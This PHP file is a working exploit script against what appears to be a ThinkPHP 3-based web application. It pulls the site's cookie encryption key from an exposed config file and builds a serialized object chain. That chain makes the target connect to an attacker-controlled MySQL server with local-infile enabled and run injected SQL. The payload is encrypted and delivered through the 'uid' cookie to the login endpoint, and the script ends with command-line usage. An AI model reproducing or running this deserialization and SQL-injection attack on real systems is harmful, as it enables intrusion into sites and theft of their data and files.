<?php
/**
* Created by : MoonBack
* Date: 2021-03-01
* Github: https://github.com/M00nBack
*/
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件
        );
        protected $config;
        public function __construct($config){
            $this->config = $config;
        }
    }
}

namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;

        public function __construct($config,$sql){
            $this->img = new Memcache($config,$sql);
        }
    }
}

namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;

        public function __construct($config,$sql){
            $this->handle = new Model($config,$sql);
        }
    }
}

namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;
        public function __construct($config,$sql){
            $this->db = new Mysql($config);
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                "table" => "user", 
                "where" => "1=0;".$sql.";"
            );
        }
    }
}

namespace {
    error_reporting(0);
    class SysCrypt {

          private $crypt_key;

          // 构造函数 
          public function __construct($crypt_key) {
             $this -> crypt_key = $crypt_key;
          }
          public function php_encrypt($txt) {
             srand((double)microtime() * 1000000);
             $encrypt_key = md5(rand(0,32000));
             $ctr = 0;
             $tmp = '';
             for($i = 0;$i<strlen($txt);$i++) {
              $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;
              $tmp .= $encrypt_key[$ctr].($txt[$i]^$encrypt_key[$ctr++]);
             }
             return base64_encode(self::__key($tmp,$this -> crypt_key));
          }
          
          public function php_decrypt($txt) {
             $txt = self::__key(base64_decode($txt),$this -> crypt_key);
             $tmp = '';
             for($i = 0;$i < strlen($txt); $i++) {
              $md5 = $txt[$i];
              $tmp .= $txt[++$i] ^ $md5;
             }
             return $tmp;
          }
          
          private function __key($txt,$encrypt_key) {
             $encrypt_key = md5($encrypt_key);
             $ctr = 0;
             $tmp = '';
             for($i = 0; $i < strlen($txt); $i++) {
              $ctr = $ctr == strlen($encrypt_key) ? 0 : $ctr;
              $tmp .= $txt[$i] ^ $encrypt_key[$ctr++];
             }
             return $tmp;
          }
          
          public function __destruct() {
             $this -> crypt_key = null;
          }
    }

    function get_key($url){
        $u = $url.'/App/Runtime/Data/config/site.php';
        $content = send_request($u);
        $pattern = '/\"CFG_COOKIE_ENCODE\";s:(\w+):\"(\w+)\"/';
        preg_match($pattern,$content,$matches);
        if($matches[2]=="" or !isset($matches[2])){
            echo "not find cookie encode key \n";
            die();
        }else{
            echo "find cookie encode key:".$matches[2]."\n\n";
        }
        return $matches[2];
    }

    function gen_payload($config,$key,$sql){
        $class = new Think\Image\Driver\Imagick($config,$sql);
        $ser = serialize($class);
        $sc = new SysCrypt(md5($key));
        $enc = $sc->php_encrypt($ser);
        return urlencode($enc);
    }

    function send_request($url, $payload=null)
    {
        if(isset($payload)){
            $opts = array('http' =>
               array(
                 'method' => 'GET',
                 'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\r\n"."Cookie: uid=".$payload
               )
            );
        }else{
            $opts = array('http' =>
               array(
                 'method' => 'GET',
                 'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
               )
             );
        }
      $context = stream_context_create($opts);
      $result = file_get_contents($url, false, $context);
      return $result;
    }

    function exploit($url,$mysql_server_host=null,$mysql_server_port=null,$user=null,$pass=null,$sql=''){
        if(isset($mysql_server_host) && isset($mysql_server_port) && isset($user) && isset($pass)){
            $config = array(
                "debug"    => 1,
                "database" => "mysql",
                "hostname" => $mysql_server_host,
                "hostport" => $mysql_server_port, 
                "charset"  => "utf8",
                "username" => $user,
                "password" => $pass
            );
            $key = get_key($url);
            $payload = gen_payload($config,$key,$sql);
            echo "payload:".$payload;
            $u = $url.'/index.php?s=/Home/Public/loginChk';
            send_request($u,$payload);
        }
    }
    $url = $argv[1];
    $mysql_host = $argv[2];
    $mysql_port = $argv[3];
    $mysql_user = $argv[4];
    $mysql_pass = $argv[5];
    $sql = $argv[6];
    if(count($argv)!=7){
        echo "Useage: php exploit.php http://127.0.0.1 1.1.1.1 3307 root root \"select sleep(3)\"\n";
    }else{
        echo "start exploit ...\n";
        $time1 = time();
        exploit($url,$mysql_host,$mysql_port,$mysql_user,$mysql_pass,$sql);
        $time2 = time();
        echo "\n\nexec exploit takes ".($time2-$time1)." seconds\n";
    }
    
}